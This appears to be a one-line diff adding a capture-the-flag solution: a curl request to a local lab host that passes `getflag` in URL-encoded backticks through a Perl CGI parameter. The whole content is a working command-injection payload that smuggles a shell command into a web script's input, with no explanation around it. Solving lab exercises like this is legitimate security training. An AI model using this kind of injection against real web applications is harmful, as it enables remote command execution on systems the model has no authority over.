@@ -1,0 +1,1 @@
+curl "10.0.2.15:4747/level05.pl?ft_cmd=%60getflag%60"
